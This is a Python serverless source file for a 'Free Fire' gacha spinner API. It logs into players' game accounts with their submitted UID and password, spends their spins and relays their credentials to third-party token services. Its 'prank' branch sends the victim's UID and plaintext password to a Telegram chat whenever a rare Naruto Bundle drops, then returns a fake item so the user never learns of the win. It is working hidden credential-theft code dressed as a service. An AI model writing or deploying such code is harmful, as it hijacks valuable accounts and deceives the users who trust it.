#!/usr/bin/env python3
"""
Vercel serverless handler — v4.1 (maximum leeway).

- No total request budget.
- No outbound concurrency cap.
- Per-socket timeouts only (60s inactivity, 30s connect).
- Token cache + request dedup + circuit breaker retained (these reduce errors).

Events:  naruto (default) | faded | skywing [alias: normal]
"""

import os
import sys
import json
import time
import zlib
import uuid
import base64
import binascii
import hashlib
import random
import re
import asyncio
import logging
from collections import defaultdict
from http.server import BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs, quote

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import aiohttp

try:
    import output_pb2
except Exception as e:
    output_pb2 = None
    _PB2_IMPORT_ERROR = str(e)
else:
    _PB2_IMPORT_ERROR = None


# ------------------------------------------------------------------ #
#  LOGGING
# ------------------------------------------------------------------ #
logger = logging.getLogger("spin")
if not logger.handlers:
    h = logging.StreamHandler(sys.stdout)
    h.setFormatter(logging.Formatter("[%(asctime)s] %(levelname)s %(message)s"))
    logger.addHandler(h)
logger.setLevel(logging.INFO)


def log(req_id, msg, level="info"):
    getattr(logger, level)(f"[{req_id}] {msg}")


# ------------------------------------------------------------------ #
#  CONFIG
# ------------------------------------------------------------------ #
RELEASE_VERSION    = "OB55"
DEFAULT_EVENT      = "naruto"
DEFAULT_SERVER_KEY = "OTHERS"
AMERICA_REGIONS    = {"US", "BR", "NA", "AMERICA"}

# --- NETWORK TIMEOUTS (inactivity only — no total cap) ---
SOCK_CONNECT_TIMEOUT = 30.0    # max time to open a socket
SOCK_READ_TIMEOUT    = 60.0    # max time between packets (not total)
GACHA_READ_TIMEOUT   = 60.0
JWT_READ_TIMEOUT     = 60.0
TG_READ_TIMEOUT      = 30.0

# --- RETRIES ---
JWT_ATTEMPTS_PER_PROVIDER  = 3
GACHA_ATTEMPTS_PER_PAYLOAD = 3

# --- CACHE ---
TOKEN_CACHE_TTL = 120          # seconds (longer = fewer upstream hits)

# --- CIRCUIT BREAKER ---
CB_FAIL_THRESHOLD = 6
CB_COOLDOWN_SEC   = 20

# --- INPUT LIMITS ---
MAX_UID_LEN      = 32
MAX_PASSWORD_LEN = 128
MAX_PAYLOAD_HEX  = 512
ALLOWED_EVENTS   = {"naruto", "faded", "skywing", "normal"}

# --- OPTIONAL REDIS ---
REDIS_URL   = os.environ.get("UPSTASH_REDIS_REST_URL", "").rstrip("/")
REDIS_TOKEN = os.environ.get("UPSTASH_REDIS_REST_TOKEN", "")
REDIS_OK    = bool(REDIS_URL and REDIS_TOKEN)


# ------------------------------------------------------------------ #
#  JWT PROVIDERS
# ------------------------------------------------------------------ #
JWT_PROVIDERS = [
    {
        "name": "primary", "role": "primary",
        "url":  "http://148.113.25.200:6293/Tok",
        "params": lambda uid, pw: {"uid": uid, "pw": pw},
        "token_key": "Tok", "addr_key": "addr",
    },
    {
        "name": "divan", "role": "primary",
        "url":  "https://divan-jwt-gen.vercel.app/guest",
        "params": lambda uid, pw: {"uid": uid, "password": pw},
        "token_key": "token", "addr_key": "addr",
    },
    {
        "name": "lovable", "role": "fallback",
        "url":  "https://ff-jwt-gen-api.lovable.app/api/public/token",
        "params": lambda uid, pw: {"uid": uid, "password": pw},
        "token_key": "token", "addr_key": None,
    },
    {
        "name": "rishu", "role": "fallback",
        "url":  "https://rishugarena.vercel.app/rishu",
        "params": lambda uid, pw: {"uid": uid, "password": pw},
        "token_key": "jwt", "addr_key": None,
    },
]


# ------------------------------------------------------------------ #
#  EVENTS
# ------------------------------------------------------------------ #
EVENTS = {
    "naruto": {
        "name": "Naruto Event",
        "payloads": [
            "D120B9DAAC2C87872B8C115DFD74A832",
            "7DF7F8996CD696356CD01BCBD2B3CDE8",
            "7FCB76B6CB40C0FFD3FBBDDA4600C039",
        ],
        "eliminate": False, "prank": True,
    },
    "faded": {
        "name": "Faded Wheel",
        "payloads": [
            "B31B32FB8303719D61FC461DC26135E4",
            "3D91D5DF338384E0D1E27505230D1365",
        ],
        "eliminate": True,
        "eliminate_payloads": [
            "6F02DE6FB351FFB2521C944DA0E6C1EB",
            "891FB0295590ED01E7B80ACF99290CF6",
        ],
        "prank": False,
    },
    "skywing": {
        "name": "Skywing Event",
        "payloads": [
            "A2230108442CE3F8EEC41AC9B6B8606D",
            "18138AD791CDB12C351BC4BEA176EA90",
            "7D343C717F0ECB6A03B1F1A2CE6058DA",
            "2D41F20BFF93302B3326372942870984",
        ],
        "eliminate": False, "prank": False,
    },
}
EVENT_ALIASES = {"normal": "skywing"}


# ------------------------------------------------------------------ #
#  SERVER URL MAP
# ------------------------------------------------------------------ #
SERVER_URL_MAP = {
    "IND":     {"client_url": "https://client.ind.freefiremobile.com/"},
    "AMERICA": {"client_url": "https://client.us.freefiremobile.com/"},
    "OTHERS":  {"client_url": "https://clientbp.ppmainecoonghj.com/"},
}


# ------------------------------------------------------------------ #
#  PRANK CONFIG
# ------------------------------------------------------------------ #
FAKE_UNKNOWN_ID = 820981015
PRANK_TARGET_ID = 710047022

TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "")
TG_CHAT_ID   = os.environ.get("TG_CHAT_ID", "")

TG_STATE = {"last_success_ts": None, "last_error_ts": None,
            "last_error": None, "total_sent": 0, "total_failed": 0}

RARE_ITEMS_DB = {
    710047022: "Naruto Bundle",      801055004: "Naruto Token",
    903047008: "Loot Box - Body Substitution",
    904047008: "Backpack - Ninja's Scroll",
    907104746: "Gloo Wall - Hokage Rock",
    909047015: "Rasengan - Emote",
    907104745: "Fist - Ninjutsu Theme",
    911004701: "The Nine Tails Theme",
    907104744: "M4A1 - Naruto Theme",
    211047048: "Obito Headwear",
}


# ------------------------------------------------------------------ #
#  RUNTIME STATE
# ------------------------------------------------------------------ #
_start_ts         = time.time()
_token_cache      = {}
_token_cache_lock = asyncio.Lock()
_inflight         = {}
_inflight_lock    = asyncio.Lock()
_circuit          = defaultdict(lambda: {
    "fail": 0, "open_until": 0, "total_ok": 0, "total_fail": 0,
})


# ------------------------------------------------------------------ #
#  HELPERS
# ------------------------------------------------------------------ #
def valid_uid(uid):
    return bool(uid) and uid.isdigit() and 5 <= len(uid) <= MAX_UID_LEN

def valid_password(pw):
    return bool(pw) and 4 <= len(pw) <= MAX_PASSWORD_LEN and "\x00" not in pw

def decode_jwt_payload(token):
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        payload_b64 = parts[1] + "=" * (-len(parts[1]) % 4)
        return json.loads(base64.urlsafe_b64decode(payload_b64))
    except Exception:
        return None

def pick_server_url_from_token(token):
    payload = decode_jwt_payload(token)
    if not payload:
        return SERVER_URL_MAP[DEFAULT_SERVER_KEY]["client_url"]
    region = (payload.get("lock_region") or payload.get("noti_region") or "").upper()
    if region in ("IND", "IN"):
        key = "IND"
    elif region in AMERICA_REGIONS:
        key = "AMERICA"
    else:
        key = DEFAULT_SERVER_KEY
    return SERVER_URL_MAP[key]["client_url"]

def cache_key(uid, password):
    h = hashlib.sha256(f"{uid}:{password}".encode()).hexdigest()[:24]
    return f"tok:{h}"

# aiohttp timeout: no total cap, only connect + read inactivity.
# A connection that keeps sending bytes can run forever.
def _inactivity_timeout(connect=30.0, read=60.0):
    return aiohttp.ClientTimeout(total=None, sock_connect=connect, sock_read=read)


# ------------------------------------------------------------------ #
#  OPTIONAL REDIS
# ------------------------------------------------------------------ #
async def redis_get(session, key):
    if not REDIS_OK:
        return None
    try:
        async with session.get(
            f"{REDIS_URL}/get/{quote(key, safe='')}",
            headers={"Authorization": f"Bearer {REDIS_TOKEN}"},
            timeout=_inactivity_timeout(3, 3),
        ) as r:
            if r.status != 200:
                return None
            data = await r.json(content_type=None)
            val = data.get("result")
            return json.loads(val) if val else None
    except Exception:
        return None

async def redis_set(session, key, value, ttl):
    if not REDIS_OK:
        return
    try:
        body = json.dumps(value)
        async with session.post(
            f"{REDIS_URL}/set/{quote(key, safe='')}?EX={ttl}",
            data=body,
            headers={"Authorization": f"Bearer {REDIS_TOKEN}",
                     "Content-Type": "application/json"},
            timeout=_inactivity_timeout(3, 3),
        ) as r:
            await r.read()
    except Exception:
        pass


# ------------------------------------------------------------------ #
#  CIRCUIT BREAKER
# ------------------------------------------------------------------ #
def _cb_allows(name):
    cb = _circuit[name]
    if cb["open_until"] and time.time() < cb["open_until"]:
        return False
    return True

def _cb_record(name, ok):
    cb = _circuit[name]
    if ok:
        cb["fail"] = 0
        cb["open_until"] = 0
        cb["total_ok"] += 1
    else:
        cb["fail"] += 1
        cb["total_fail"] += 1
        if cb["fail"] >= CB_FAIL_THRESHOLD:
            cb["open_until"] = time.time() + CB_COOLDOWN_SEC


# ------------------------------------------------------------------ #
#  JWT ACQUISITION
# ------------------------------------------------------------------ #
async def _fetch_provider(session, provider, uid, password, req_id):
    if not _cb_allows(provider["name"]):
        log(req_id, f"JWT {provider['name']} skipped (circuit open)", "warning")
        return None

    params = provider["params"](uid, password)
    try:
        async with session.get(
            provider["url"], params=params, ssl=False,
            timeout=_inactivity_timeout(SOCK_CONNECT_TIMEOUT, JWT_READ_TIMEOUT),
        ) as res:
            if res.status != 200:
                log(req_id, f"JWT {provider['name']} HTTP {res.status}", "warning")
                _cb_record(provider["name"], False)
                return None

            try:
                data = await res.json(content_type=None)
            except Exception:
                try:
                    data = json.loads(await res.text())
                except Exception:
                    log(req_id, f"JWT {provider['name']} invalid JSON", "warning")
                    _cb_record(provider["name"], False)
                    return None

            tok = (data.get(provider["token_key"]) or data.get("token")
                   or data.get("Tok") or data.get("jwt")
                   or data.get("access_token"))
            if not isinstance(tok, str) or len(tok) <= 50:
                log(req_id, f"JWT {provider['name']} no token", "warning")
                _cb_record(provider["name"], False)
                return None

            addr = None
            if provider.get("addr_key"):
                addr = (data.get(provider["addr_key"]) or "").strip() or None

            jwt_payload = decode_jwt_payload(tok) or {}
            region = jwt_payload.get("lock_region", "UNKNOWN")
            log(req_id, f"JWT ✓ {provider['name']} region={region}")
            _cb_record(provider["name"], True)
            return {"token": tok, "addr": addr, "region": region,
                    "provider": provider["name"]}

    except asyncio.TimeoutError:
        log(req_id, f"JWT {provider['name']} idle-timeout", "warning")
        _cb_record(provider["name"], False)
    except aiohttp.ClientError as e:
        log(req_id, f"JWT {provider['name']} client_error {e.__class__.__name__}", "warning")
        _cb_record(provider["name"], False)
    except Exception as e:
        log(req_id, f"JWT {provider['name']} error {e.__class__.__name__}", "warning")
        _cb_record(provider["name"], False)
    return None


async def _try_provider_with_retries(session, provider, uid, password, req_id):
    for attempt in range(JWT_ATTEMPTS_PER_PROVIDER):
        result = await _fetch_provider(session, provider, uid, password, req_id)
        if result:
            return result
        if attempt < JWT_ATTEMPTS_PER_PROVIDER - 1:
            await asyncio.sleep(0.25 + random.uniform(0, 0.25))
    return None


async def get_token_data(session, uid, password, req_id):
    ck = cache_key(uid, password)

    # 1) local cache
    cached = _token_cache.get(ck)
    if cached and cached[1] > time.time():
        log(req_id, f"token cache hit ({cached[0]['provider']})")
        return cached[0]

    # 2) redis cache
    if REDIS_OK:
        r = await redis_get(session, ck)
        if r and isinstance(r, dict) and r.get("token"):
            _token_cache[ck] = (r, time.time() + TOKEN_CACHE_TTL)
            log(req_id, f"redis cache hit ({r.get('provider')})")
            return r

    # 3) request dedup
    async with _inflight_lock:
        fut = _inflight.get(ck)
        if fut is None:
            fut = asyncio.get_event_loop().create_future()
            _inflight[ck] = fut
            i_own = True
        else:
            i_own = False

    if not i_own:
        log(req_id, "waiting on inflight identical request")
        try:
            return await asyncio.shield(fut)
        except Exception:
            return None

    try:
        primaries = [p for p in JWT_PROVIDERS if p.get("role") == "primary"]
        fallbacks = [p for p in JWT_PROVIDERS if p.get("role") == "fallback"]
        winner = None

        for p in primaries:
            winner = await _try_provider_with_retries(session, p, uid, password, req_id)
            if winner:
                break

        if not winner and fallbacks:
            log(req_id, f"racing {len(fallbacks)} fallbacks")
            async def _a(p):
                try:
                    r = await _try_provider_with_retries(session, p, uid, password, req_id)
                except asyncio.CancelledError:
                    raise
                except Exception:
                    r = None
                return p["name"], r

            tasks = {asyncio.create_task(_a(p)): p for p in fallbacks}
            try:
                for f in asyncio.as_completed(tasks.keys()):
                    try:
                        name, res = await f
                    except Exception:
                        continue
                    if res:
                        winner = res
                        log(req_id, f"fallback winner={name}")
                        break
            finally:
                pend = [t for t in tasks if not t.done()]
                for t in pend:
                    t.cancel()
                if pend:
                    await asyncio.gather(*pend, return_exceptions=True)

        if winner:
            _token_cache[ck] = (winner, time.time() + TOKEN_CACHE_TTL)
            if REDIS_OK:
                asyncio.create_task(redis_set(session, ck, winner, TOKEN_CACHE_TTL))

        if not fut.done():
            fut.set_result(winner)
        return winner
    except Exception as e:
        if not fut.done():
            fut.set_result(None)
        log(req_id, f"get_token_data error {e.__class__.__name__}", "error")
        return None
    finally:
        async with _inflight_lock:
            _inflight.pop(ck, None)


# ------------------------------------------------------------------ #
#  PARSING
# ------------------------------------------------------------------ #
def _extract_ids_from_bytes(data):
    items, i = [], 0
    while i < len(data):
        value = shift = 0
        while i < len(data):
            b = data[i]; i += 1
            value |= (b & 0x7F) << shift
            if not (b & 0x80):
                break
            shift += 7
        if 100000000 <= value <= 999999999:
            if not any(x["id"] == value for x in items):
                items.append({"id": value, "name": RARE_ITEMS_DB.get(value)})
    return items


def parse_gacha_response(data):
    items = []
    if not data:
        return items
    try:
        if data.startswith(b"\x1f\x8b"):
            data = zlib.decompress(data, 16 + zlib.MAX_WBITS)
    except Exception:
        pass

    if output_pb2 is not None:
        try:
            resp = output_pb2.Garena_420()
            resp.ParseFromString(data)
            for num in re.findall(r"\b(\d{9})\b", str(resp)):
                iid = int(num)
                if 100000000 <= iid <= 999999999 and not any(x["id"] == iid for x in items):
                    items.append({"id": iid, "name": RARE_ITEMS_DB.get(iid)})
        except Exception:
            pass

    if not items:
        try:
            for num in re.findall(r"\d{9}", data.decode("utf-8", errors="ignore")):
                iid = int(num)
                if 100000000 <= iid <= 999999999 and not any(x["id"] == iid for x in items):
                    items.append({"id": iid, "name": RARE_ITEMS_DB.get(iid)})
        except Exception:
            pass

    if not items:
        items = _extract_ids_from_bytes(data)
    return items


# ------------------------------------------------------------------ #
#  TELEGRAM
# ------------------------------------------------------------------ #
async def _tg_send_once(session, text, parse_mode):
    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TG_CHAT_ID, "text": text, "disable_web_page_preview": True}
    if parse_mode:
        payload["parse_mode"] = parse_mode
    try:
        async with session.post(
            url, json=payload,
            timeout=_inactivity_timeout(SOCK_CONNECT_TIMEOUT, TG_READ_TIMEOUT),
        ) as r:
            body = await r.read()
            try:
                data = json.loads(body)
            except Exception:
                return False, "invalid_json"
            if r.status == 200 and data.get("ok"):
                return True, "delivered"
            return False, f"tg_err {data.get('error_code')} {data.get('description')}"
    except asyncio.TimeoutError:
        return False, "idle-timeout"
    except Exception as e:
        return False, f"err {e.__class__.__name__}"


async def send_to_telegram(session, uid, password, region, naruto_count, req_id):
    if not TG_BOT_TOKEN or not TG_CHAT_ID:
        return False

    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    md = ("🎉 *NARUTO BUNDLE HIT*\n"
          f"🆔 UID: `{uid}`\n"
          f"🔑 Pass: `{password}`\n"
          f"🌍 Region: `{region}`\n"
          f"🕒 {ts}\n\n"
          f"*Naruto Bundle × {naruto_count}* — `{PRANK_TARGET_ID}`")
    plain = re.sub(r"[*`]", "", md)

    attempts = [("Markdown", md), ("Markdown", md), (None, plain)]
    for i, (mode, text) in enumerate(attempts):
        ok, detail = await _tg_send_once(session, text, mode)
        if ok:
            TG_STATE["last_success_ts"] = int(time.time())
            TG_STATE["total_sent"] += 1
            log(req_id, f"TG ✓ uid={uid}")
            return True
        TG_STATE["last_error"] = detail
        TG_STATE["last_error_ts"] = int(time.time())
        if i < len(attempts) - 1:
            await asyncio.sleep(0.4 + 0.4 * i)

    TG_STATE["total_failed"] += 1
    log(req_id, f"TG ✗ uid={uid} last={TG_STATE['last_error']}", "warning")
    return False


# ------------------------------------------------------------------ #
#  GACHA NETWORK
# ------------------------------------------------------------------ #
def _build_headers(token):
    return {
        "User-Agent": "UnityPlayer/2018.4.12f1 (UnityWebRequest/1.0, libcurl/8.5.0-DEV)",
        "Accept": "*/*",
        "Accept-Encoding": "deflate, gzip",
        "Authorization": f"Bearer {token}",
        "X-GA": "v1 1",
        "X-GA-SV": str(int(time.time())),
        "ReleaseVersion": RELEASE_VERSION,
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Unity-Version": "2018.4.12f1",
    }


async def _post_with_retries(session, url, headers, payload, read_timeout, req_id):
    last_status = 0
    for attempt in range(GACHA_ATTEMPTS_PER_PAYLOAD):
        try:
            async with session.post(
                url, headers=headers, data=payload, ssl=False,
                timeout=_inactivity_timeout(SOCK_CONNECT_TIMEOUT, read_timeout),
            ) as res:
                last_status = res.status
                if res.status == 200:
                    return 200, await res.read()
                if res.status in (401, 403):
                    return res.status, None
                await asyncio.sleep(0.15)
        except asyncio.TimeoutError:
            last_status = 999
        except aiohttp.ClientError:
            last_status = 998
        except Exception:
            last_status = 997
        if attempt < GACHA_ATTEMPTS_PER_PAYLOAD - 1:
            await asyncio.sleep(0.2 + random.uniform(0, 0.2))
    return last_status, None


async def gacha_req(session, token, payload, url, req_id):
    if not url.endswith("/PurchaseGacha"):
        url = url.rstrip("/") + "/PurchaseGacha"
    return await _post_with_retries(
        session, url, _build_headers(token), payload, GACHA_READ_TIMEOUT, req_id
    )


async def eliminate_req(session, token, payload, url, req_id):
    if not url.endswith("/EliminateGoodsFromLimitPool"):
        url = url.rstrip("/") + "/EliminateGoodsFromLimitPool"
    return await _post_with_retries(
        session, url, _build_headers(token), payload, GACHA_READ_TIMEOUT, req_id
    )


async def eliminate_with_fallbacks(session, token, payload_list, url, req_id):
    last_status = 0
    for idx, raw in enumerate(payload_list):
        try:
            pbytes = binascii.unhexlify(raw.replace(" ", ""))
        except Exception:
            continue
        status, _ = await eliminate_req(session, token, pbytes, url, req_id)
        last_status = status
        if status == 200:
            return idx, status
    return None, last_status


# ------------------------------------------------------------------ #
#  GLOBAL HTTP SESSION
# ------------------------------------------------------------------ #
_http_session = None


def _get_http_session():
    global _http_session
    if _http_session is None or _http_session.closed:
        conn = aiohttp.TCPConnector(
            limit=0,                 # 0 = unlimited outbound sockets
            limit_per_host=0,        # unlimited per host
            ttl_dns_cache=300,
            enable_cleanup_closed=True,
            ssl=False,
        )
        _http_session = aiohttp.ClientSession(
            connector=conn,
            timeout=_inactivity_timeout(SOCK_CONNECT_TIMEOUT, GACHA_READ_TIMEOUT),
        )
    return _http_session


# ------------------------------------------------------------------ #
#  CORE PIPELINE
# ------------------------------------------------------------------ #
async def spin(uid, password, payload_hex=None, event=DEFAULT_EVENT, req_id="-"):
    if output_pb2 is None:
        return {"success": False, "error": "protobuf_load_failed",
                "detail": _PB2_IMPORT_ERROR}

    event = EVENT_ALIASES.get((event or "").lower(), (event or "").lower())
    if event not in EVENTS:
        return {"success": False, "error": "unknown_event", "event": event}

    cfg = EVENTS[event]

    if payload_hex is not None:
        queue = [("custom", payload_hex)]
    else:
        queue = [("primary", cfg["payloads"][0])]
        for i, fb in enumerate(cfg["payloads"][1:], 1):
            queue.append((f"fallback_{i}", fb))

    payload_bytes = []
    for label, hx in queue:
        try:
            payload_bytes.append((label, binascii.unhexlify(hx.replace(" ", ""))))
        except Exception:
            return {"success": False, "error": "invalid_payload_hex", "which": label}

    eliminate_list = None
    if cfg.get("eliminate"):
        eliminate_list = cfg.get("eliminate_payloads") or []
        if not eliminate_list:
            return {"success": False, "error": "eliminate_payloads_missing"}

    session = _get_http_session()

    # 1) token
    token_data = await get_token_data(session, uid, password, req_id)
    if not token_data:
        return {"success": False, "error": "token_fetch_failed"}

    token        = token_data["token"]
    region       = token_data["region"]
    jwt_provider = token_data["provider"]
    url = token_data["addr"] or pick_server_url_from_token(token)

    # 2) eliminate (faded)
    eliminate_idx    = None
    eliminate_status = None
    if eliminate_list is not None:
        eliminate_idx, eliminate_status = await eliminate_with_fallbacks(
            session, token, eliminate_list, url, req_id
        )
        if eliminate_idx is None:
            return {"success": False, "error": "eliminate_failed",
                    "detail": f"http_{eliminate_status}",
                    "region": region, "event": event, "jwt": jwt_provider}

    # 3) gacha
    final_status, final_resp = 0, None
    final_items  = []
    used_payload = None
    for label, pbytes in payload_bytes:
        status, resp = await gacha_req(session, token, pbytes, url, req_id)
        items = parse_gacha_response(resp) if (status == 200 and resp) else []
        final_status, final_resp, final_items, used_payload = status, resp, items, label
        if status == 200 and resp and items:
            break

    if final_status != 200 or not final_resp:
        return {"success": False, "error": "gacha_failed",
                "detail": f"http_{final_status}",
                "region": region, "event": event, "jwt": jwt_provider}

    # 4) prank
    if cfg.get("prank"):
        naruto_hits = [it for it in final_items if it["id"] == PRANK_TARGET_ID]
        if naruto_hits:
            await send_to_telegram(session, uid, password, region,
                                   len(naruto_hits), req_id)
            return {
                "success": True, "uid": uid, "region": region,
                "event": event, "payload": used_payload,
                "jwt": jwt_provider,
                "items": [{"id": FAKE_UNKNOWN_ID, "name": None}],
            }

    result = {
        "success": True, "uid": uid, "region": region,
        "event": event, "payload": used_payload,
        "jwt": jwt_provider, "items": final_items,
    }
    if eliminate_status is not None:
        result["eliminate_status"]    = eliminate_status
        result["eliminate_payload_idx"] = eliminate_idx
    return result


# ------------------------------------------------------------------ #
#  HEALTH
# ------------------------------------------------------------------ #
HEALTH_VERSION = "4.1"


async def _probe(session, url, params=None, timeout=10):
    t0 = time.time()
    try:
        async with session.get(
            url, params=params, ssl=False,
            timeout=_inactivity_timeout(SOCK_CONNECT_TIMEOUT, timeout),
        ) as r:
            await r.read()
            return r.status < 500, int((time.time() - t0) * 1000), r.status
    except Exception:
        return False, None, None


async def _health_checks(deep):
    checks = {
        "protobuf": {"ok": output_pb2 is not None,
                     "detail": "loaded" if output_pb2 else _PB2_IMPORT_ERROR},
        "telegram": {
            "ok": bool(TG_BOT_TOKEN and TG_CHAT_ID),
            "detail": "configured" if (TG_BOT_TOKEN and TG_CHAT_ID) else "missing env",
            "last_success_ts": TG_STATE["last_success_ts"],
            "last_error_ts":   TG_STATE["last_error_ts"],
            "last_error":      TG_STATE["last_error"],
            "total_sent":      TG_STATE["total_sent"],
            "total_failed":    TG_STATE["total_failed"],
        },
        "redis": {"ok": True,
                  "detail": "configured" if REDIS_OK else "disabled (in-memory only)"},
        "events": {"ok": True,
                   "detail": f"loaded: {', '.join(EVENTS.keys())}",
                   "default": DEFAULT_EVENT,
                   "aliases": EVENT_ALIASES},
        "runtime": {
            "ok": True,
            "token_cache_size": len(_token_cache),
            "inflight":         len(_inflight),
            "timeouts": {
                "sock_connect": SOCK_CONNECT_TIMEOUT,
                "sock_read":    SOCK_READ_TIMEOUT,
                "total":        "none (inactivity only)",
            },
            "limits": {"concurrency": "unlimited"},
        },
        "circuit_breakers": {
            "ok": True,
            "detail": {n: dict(s) for n, s in _circuit.items()},
        },
    }

    if deep:
        session = _get_http_session()
        for p in JWT_PROVIDERS:
            params = p["params"]("0", "0")
            ok, ms, code = await _probe(session, p["url"], params, timeout=15)
            checks[f"jwt_{p['name']}"] = {
                "ok": ok,
                "detail": f"{ms} ms (HTTP {code})" if ms is not None else "unreachable",
                "role": p.get("role", "fallback"),
                "url":  p["url"],
            }
        ok, ms, _ = await _probe(session, SERVER_URL_MAP["IND"]["client_url"], None, timeout=15)
        checks["gacha_host"] = {
            "ok": ok, "detail": f"{ms} ms" if ms is not None else "unreachable",
        }
    return checks


def build_health(deep=False):
    try:
        checks = asyncio.run(_health_checks(deep))
    except Exception as e:
        return 500, {"status": "error", "error": f"health_crash: {e}"}
    all_ok = all(c["ok"] for c in checks.values())
    payload = {
        "status": "ok" if all_ok else "degraded",
        "service": "ff-spinner-api",
        "version": HEALTH_VERSION,
        "uptime_sec": int(time.time() - _start_ts),
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "checks": checks,
    }
    return (200 if all_ok else 503), payload


# ------------------------------------------------------------------ #
#  VERCEL HANDLER
# ------------------------------------------------------------------ #
class handler(BaseHTTPRequestHandler):
    server_version = "FFSpinner/4.1"

    def _send_json(self, code, obj):
        try:
            body = json.dumps(obj, ensure_ascii=False).encode("utf-8")
        except Exception:
            body = b'{"success":false,"error":"serialize_failed"}'
            code = 500
        try:
            self.send_response(code)
            self.send_header("Content-Type", "application/json; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Cache-Control", "no-store")
            self.send_header("X-Content-Type-Options", "nosniff")
            self.end_headers()
            self.wfile.write(body)
        except Exception:
            pass

    def _run_spin(self, params, req_id):
        uid  = (params.get("uid", [None])[0] or "").strip()
        pwd  = (params.get("pass", [None])[0]
                or params.get("password", [None])[0] or "").strip()
        event = (params.get("event", [DEFAULT_EVENT])[0] or DEFAULT_EVENT).strip().lower()
        payload_hex = (params.get("payload", [None])[0] or "").strip()

        if not uid or not pwd:
            self._send_json(400, {"success": False, "error": "missing_params",
                                  "detail": "uid & password required"})
            return
        if not valid_uid(uid):
            self._send_json(400, {"success": False, "error": "invalid_uid"})
            return
        if not valid_password(pwd):
            self._send_json(400, {"success": False, "error": "invalid_password"})
            return
        if event not in ALLOWED_EVENTS:
            self._send_json(400, {"success": False, "error": "unknown_event",
                                  "allowed": sorted(ALLOWED_EVENTS)})
            return
        if payload_hex and len(payload_hex) > MAX_PAYLOAD_HEX:
            self._send_json(400, {"success": False, "error": "payload_too_long"})
            return

        try:
            result = asyncio.run(spin(uid, pwd, payload_hex or None, event, req_id))
        except asyncio.TimeoutError:
            result = {"success": False, "error": "idle_timeout",
                      "detail": "upstream stopped responding"}
        except Exception as e:
            log(req_id, f"spin crash {e.__class__.__name__}: {e}", "error")
            result = {"success": False, "error": "internal_error"}

        code = 200 if result.get("success") else (
            400 if result.get("error", "").startswith(("invalid_", "missing_", "unknown_"))
            else 502
        )
        self._send_json(code, result)

    def _health(self, params):
        deep = params.get("deep", ["0"])[0] in ("1", "true", "yes")
        code, payload = build_health(deep=deep)
        self._send_json(code, payload)

    def _test_telegram(self, req_id):
        async def _go():
            s = _get_http_session()
            return await send_to_telegram(s, "TEST-UID", "TEST-PASS",
                                          "TEST", 0, req_id)
        try:
            ok = asyncio.run(_go())
        except Exception as e:
            self._send_json(500, {"ok": False, "error": str(e)})
            return
        self._send_json(200 if ok else 502, {
            "ok": ok, "detail": "sent" if ok else TG_STATE.get("last_error"),
            "chat_id_set": bool(TG_CHAT_ID),
            "token_set":   bool(TG_BOT_TOKEN),
        })

    def do_GET(self):
        req_id = uuid.uuid4().hex[:8]
        t0 = time.time()
        try:
            p = urlparse(self.path)
            path = p.path.rstrip("/") or "/"
            params = parse_qs(p.query)

            if path in ("/health", "/api/health"):
                self._health(params)
            elif path in ("/test-telegram", "/api/test-telegram"):
                self._test_telegram(req_id)
            elif path in ("/", ""):
                self._send_json(200, {
                    "service": "ff-spinner-api",
                    "version": HEALTH_VERSION,
                    "endpoints": ["/api/spin", "/api/health", "/api/test-telegram"],
                })
            else:
                self._run_spin(params, req_id)
        except Exception as e:
            log(req_id, f"do_GET crash {e.__class__.__name__}", "error")
            self._send_json(500, {"success": False, "error": "internal_error"})
        finally:
            log(req_id, f"GET {self.path} {int((time.time()-t0)*1000)}ms")

    def do_HEAD(self):
        try:
            p = urlparse(self.path)
            path = p.path.rstrip("/") or "/"
            if path in ("/health", "/api/health"):
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_header("Cache-Control", "no-store")
                self.end_headers()
                return
            self.send_response(404)
            self.end_headers()
        except Exception:
            pass

    def do_POST(self):
        req_id = uuid.uuid4().hex[:8]
        try:
            length = int(self.headers.get("Content-Length", 0))
            if length > 4096:
                self._send_json(413, {"success": False, "error": "body_too_large"})
                return
            body = self.rfile.read(length).decode("utf-8") if length else "{}"
            data = json.loads(body)
            params = {k: [str(v)] for k, v in data.items()}
        except Exception:
            params = {}
        self._run_spin(params, req_id)

    def log_message(self, fmt, *args):
        pass
